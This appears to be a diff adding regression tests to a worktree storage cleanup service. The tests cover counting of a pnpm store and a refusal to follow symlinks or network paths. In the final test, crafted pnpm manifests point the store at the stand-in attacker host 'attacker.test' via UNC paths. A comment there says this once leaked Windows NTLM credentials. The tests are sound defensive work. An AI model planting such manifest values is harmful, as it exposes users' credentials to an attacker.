@@ -1416,6 +1416,160 @@ describe("storage cleanup reports and local file policies", () => {
       }),
     ),
   );
+  it.live.each(["same-device", "other-device", "no-manifest"] as const)(
+    "counts the pnpm virtual store only when its store forces copies (%s)",
+    (store) =>
+      runCleanupTest(
+        Effect.gen(function* () {
+          const fs = yield* FileSystem.FileSystem;
+          const storeDir = yield* fs.makeTempDirectoryScoped({ prefix: "pnpm-store-" });
+          const { service, worktree, setPolicy } = yield* cleanupFixture().pipe(
+            Effect.provideService(FileSystem.FileSystem, {
+              ...fs,
+              stat: (target) =>
+                fs
+                  .stat(target)
+                  .pipe(
+                    Effect.map((info) =>
+                      store === "other-device" && target === storeDir
+                        ? { ...info, dev: info.dev + 1n }
+                        : info,
+                    ),
+                  ),
+            }),
+          );
+          setPolicy("tracked-changes");
+          const nodeModules = `${worktree}/node_modules`;
+          yield* fs.makeDirectory(`${nodeModules}/.pnpm/pkg@1.0.0`, { recursive: true });
+          yield* fs.makeDirectory(`${nodeModules}/.vite`);
+          yield* fs.writeFileString(
+            `${nodeModules}/.pnpm/pkg@1.0.0/index.js`,
+            "clone ".repeat(10_000),
+          );
+          yield* fs.writeFileString(`${nodeModules}/.vite/deps.js`, "cache");
+          if (store !== "no-manifest")
+            yield* fs.writeFileString(
+              `${nodeModules}/.modules.yaml`,
+              JSON.stringify({ storeDir, virtualStoreDir: ".pnpm" }),
+            );
+          const counted = [
+            ...(yield* fs.readDirectory(worktree)).flatMap((name) =>
+              name === "node_modules" ? [] : [`${worktree}/${name}`],
+            ),
+            `${nodeModules}/.vite/deps.js`,
+            ...(store === "no-manifest" ? [] : [`${nodeModules}/.modules.yaml`]),
+            ...(store === "same-device" ? [] : [`${nodeModules}/.pnpm/pkg@1.0.0/index.js`]),
+          ];
+          const bytes = (yield* Effect.forEach(counted, (file) => allocatedBytes(fs, file))).reduce(
+            (sum, size) => sum + size,
+            0,
+          );
+          const report = yield* service.runNow;
+          expect(report.entries[0]).toMatchObject({ outcome: "removed", bytes });
+        }),
+      ),
+  );
+  // A checkout or an agent can link the manifest anywhere, including a network share.
+  it.live("ignores a pnpm manifest reached through a link", () =>
+    runCleanupTest(
+      Effect.gen(function* () {
+        const fs = yield* FileSystem.FileSystem;
+        const storeDir = yield* fs.makeTempDirectoryScoped({ prefix: "pnpm-store-" });
+        const outside = yield* fs.makeTempDirectoryScoped();
+        const { service, worktree, setPolicy } = yield* cleanupFixture();
+        setPolicy("tracked-changes");
+        const nodeModules = `${worktree}/node_modules`;
+        yield* fs.makeDirectory(`${nodeModules}/.pnpm/pkg@1.0.0`, { recursive: true });
+        yield* fs.writeFileString(
+          `${nodeModules}/.pnpm/pkg@1.0.0/index.js`,
+          "clone ".repeat(10_000),
+        );
+        yield* fs.writeFileString(
+          `${outside}/.modules.yaml`,
+          JSON.stringify({ storeDir, virtualStoreDir: ".pnpm" }),
+        );
+        yield* fs.symlink(`${outside}/.modules.yaml`, `${nodeModules}/.modules.yaml`);
+        const counted = [
+          ...(yield* fs.readDirectory(worktree)).flatMap((name) =>
+            name === "node_modules" ? [] : [`${worktree}/${name}`],
+          ),
+          `${nodeModules}/.pnpm/pkg@1.0.0/index.js`,
+        ];
+        const bytes = (yield* Effect.forEach(counted, (file) => allocatedBytes(fs, file))).reduce(
+          (sum, size) => sum + size,
+          0,
+        );
+        const report = yield* service.runNow;
+        expect(report.entries[0]).toMatchObject({ outcome: "removed", bytes });
+      }),
+    ),
+  );
+  // A checkout can link a directory to a network share and point the manifest
+  // through it, so nothing beneath a link inside the worktree may be touched.
+  it.live("never reads through a link inside the worktree to find the pnpm store", () =>
+    runCleanupTest(
+      Effect.gen(function* () {
+        const fs = yield* FileSystem.FileSystem;
+        const storeDir = yield* fs.makeTempDirectoryScoped({ prefix: "pnpm-store-" });
+        const outside = yield* fs.makeTempDirectoryScoped();
+        const touched: Array<string> = [];
+        const record = (target: string) => {
+          touched.push(target);
+        };
+        const { service, worktree, setPolicy } = yield* cleanupFixture().pipe(
+          Effect.provideService(FileSystem.FileSystem, {
+            ...fs,
+            stat: (target) =>
+              Effect.sync(() => record(target)).pipe(Effect.andThen(fs.stat(target))),
+            readLink: (target) =>
+              Effect.sync(() => record(target)).pipe(Effect.andThen(fs.readLink(target))),
+          }),
+        );
+        setPolicy("tracked-changes");
+        const nodeModules = `${worktree}/node_modules`;
+        yield* fs.makeDirectory(`${nodeModules}/.pnpm`, { recursive: true });
+        yield* fs.makeDirectory(`${outside}/store`);
+        yield* fs.symlink(outside, `${worktree}/redirect`);
+        yield* fs.writeFileString(
+          `${nodeModules}/.modules.yaml`,
+          JSON.stringify({ storeDir, virtualStoreDir: "../redirect/store" }),
+        );
+        const report = yield* service.runNow;
+        expect(report.entries[0]).toMatchObject({ outcome: "removed" });
+        expect(touched.filter((target) => target.endsWith("/redirect/store"))).toEqual([]);
+      }),
+    ),
+  );
+  // An agent can write this manifest. Statting its store sent the Windows
+  // user's NTLM credentials to attacker.test during a background sweep.
+  it.live.each([
+    { storeDir: "\\\\attacker.test\\s" },
+    { storeDir: "/local/store", virtualStoreDir: "//attacker.test/s" },
+  ])("never stats a network pnpm store %o", (manifest) =>
+    runCleanupTest(
+      Effect.gen(function* () {
+        const fs = yield* FileSystem.FileSystem;
+        const statted: Array<string> = [];
+        const { service, worktree, setPolicy } = yield* cleanupFixture().pipe(
+          Effect.provideService(FileSystem.FileSystem, {
+            ...fs,
+            stat: (target) => {
+              statted.push(target);
+              return fs.stat(target);
+            },
+          }),
+        );
+        setPolicy("tracked-changes");
+        yield* fs.makeDirectory(`${worktree}/node_modules`);
+        yield* fs.writeFileString(
+          `${worktree}/node_modules/.modules.yaml`,
+          JSON.stringify(manifest),
+        );
+        expect((yield* service.runNow).entries[0]).toMatchObject({ outcome: "removed" });
+        expect(statted.filter((target) => target.includes("attacker.test"))).toEqual([]);
+      }),
+    ),
+  );
   it.live("still removes a worktree when measuring its size fails", () =>
     runCleanupTest(
       Effect.gen(function* () {
